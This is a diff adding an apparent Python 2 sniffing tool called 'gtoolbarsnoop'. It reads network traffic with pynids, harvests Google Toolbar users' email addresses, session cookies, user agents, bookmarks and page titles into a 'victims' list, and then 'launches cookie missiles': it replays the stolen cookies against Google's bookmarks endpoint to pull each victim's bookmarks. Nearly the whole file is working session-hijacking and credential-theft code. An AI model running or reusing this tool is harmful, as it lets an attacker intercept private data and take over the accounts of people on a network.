@@ -1,0 +1,120 @@
+#got anything to examine?
+	#two options here..wait for data or wait for end of stream. End of stream is conservative and more consistent, but lags if feed a stdin stream
+	#if (options['file'] <> '-' and tcp.nids_state in end_states) or 
+	#if ( options['file']=='-' and (len(str(tcp.server.data[:tcp.server.count]).strip())>0 or tcp.nids_state in end_states)):
+	if tcp.nids_state in end_states:	
+		sload=""
+	        ((src, sport), (dst, dport)) = tcp.addr	
+		if options['debug']:
+		        print "processing stream between:", tcp.addr		
+		sload=str(tcp.server.data[:tcp.server.count]).strip()
+		sload=sload + str(tcp.client.data[:tcp.client.count]).strip()
+
+		if useragentre.findall(sload) and tbemailre.findall(sload):
+			#we collect emails and store stuff indexed by it whether we're asked to or not
+			#if we launch cookie missles later, we'll use this info 
+			#if we're asked, we'll cough them up along the way.
+			if options['debug'] or options['emails']:
+				sys.stdout.write('gtoolbarsnoop: found an email address\n')
+				sys.stdout.write('Conversation: ' + str(tcp.addr) + '\n')
+				sys.stdout.write('clientIP: ' + str(src) + '\n')			
+			for email in tbemailre.finditer(sload):
+				if options['debug'] or options['emails']:			
+					sys.stdout.write(email.group(1) + '\n')
+				if email.group(1) not in victims:
+					victims.append(email.group(1))
+				for cookie in tbgooglecookiere.finditer(sload):
+					victimscookies[email.group(1)]=cookie.group(1).strip()	
+				for useragent in useragentre.finditer(sload):
+					victimsuseragents[email.group(1)]=useragent.group(1).strip()
+
+			
+		if useragentre.findall(sload) and faviconre.findall(sload) and options['icons']:
+			sys.stdout.write('gtoolbarsnoop: found a favicon hit\n')
+			sys.stdout.write('Conversation: ' + str(tcp.addr) + '\n')
+			sys.stdout.write('clientIP: ' + str(src) + '\n')			
+			sys.stdout.write(str(tcp.server.data[:tcp.server.count]) + '\n')
+
+		if bookmarksre.findall(sload) and options['bookmarks']:
+			sys.stdout.write('gtoolbarsnoop: found bookmarks\n')
+			sys.stdout.write('Conversation: ' + str(tcp.addr) + '\n')
+			sys.stdout.write('clientIP: ' + str(src) + '\n')
+			sys.stdout.write(str(tcp.client.data[:tcp.client.count]) + '\n')
+			
+		if titlere.findall(sload) and options['titles']:
+			sys.stdout.write('gtoolbarsnoop: found titles\n')
+			sys.stdout.write('clientIP: ' + str(src) + '\n')			
+			for title in titlere.finditer(sload):
+				sys.stdout.write(title.group(1) + '\n')
+
+		if setgooglecookiere.findall(sload) and useragentre.findall(sload) and options['cookies']:
+			sys.stdout.write('gtoolbarsnoop: found set cookie\n')
+			sys.stdout.write('clientIP: ' + str(src) + '\n')			
+			for cookie in setgooglecookiere.finditer(sload):
+				sys.stdout.write(cookie.group(1) + '\n')
+				
+		if tbgooglecookiere.findall(sload) and useragentre.findall(sload) and options['cookies']:
+			sys.stdout.write('gtoolbarsnoop: found toolbar cookie\n')
+			sys.stdout.write('clientIP: ' + str(src) + '\n')			
+			for cookie in tbgooglecookiere.finditer(sload):
+				sys.stdout.write(cookie.group(1) + '\n')
+				
+				
+def missilesAway():
+	if len(victimscookies)>0:
+		for vic in victims:	
+			sys.stdout.write('launching cookie missle against: ' + vic + '\n')
+			#clients1-4 return identical dns ips...
+			url = 'http://clients4.google.com/bookmarks/?output=xml&all=1'
+			user_agent = victimsuseragents.get(vic)
+			cookie=victimscookies.get(vic)
+
+			#the right way to do values..that I'm ignoring.
+			#values = {'name' : 'Michael Foord',
+        		#	  'location' : 'Northampton',
+        		#	  'language' : 'Python' }
+
+			headers = { 'User-Agent:' : user_agent,'Cookie:' : cookie  }
+			#data = urllib.urlencode(values)
+			data=''
+			req = urllib2.Request(url, data, headers)
+			#debug
+			#sys.stderr.write('url:' + str(req.get_full_url()) + '\n')
+			#sys.stderr.write('headers:' + str(req.header_items()) + '\n')
+			response = urllib2.urlopen(req)
+			sys.stdout.write(vic + 'bookmarks: ' + str(response.read()) + '\n')
+
+
+def main():
+	global options
+	options = read_options()
+	nids.param("scan_num_hosts", 0)         # disable portscan detection
+
+	#if options['file'] <> '-':
+	#	nids.param("filename", options['file'])
+	#else: 
+	#	nids.param("filename", sys.stdin.name)
+	
+	if options['file'] and os.path.isfile(options['file']):                  # read a pcap file?
+        	nids.param("filename", options['file'])
+	else:
+	    	nids.param("device", options['file']) #assume network device.		
+				
+	nids.init()
+	nids.register_tcp(handleTcpStream)
+	# Loop forever (network device), or until EOF (pcap file)
+	# Note that an exception in the callback will break the loop!
+	try:
+		nids.run()
+	except nids.error, e:
+		print "nids/pcap error:", e
+	except Exception, e:
+		print "misc. exception (runtime error in user callback?):", e
+	if options['debug']:
+		sys.stderr.write('Grand totals:\n')
+		sys.stderr.write('Victims: ' + str(victims) + '\n')
+		sys.stderr.write('VictimsCookies: ' + str(victimscookies) + '\n')
+		sys.stderr.write('VictimsUserAgents: ' + str(victimsuseragents) + '\n')
+	if options['missile']:
+		missilesAway()
+	sys.exit()
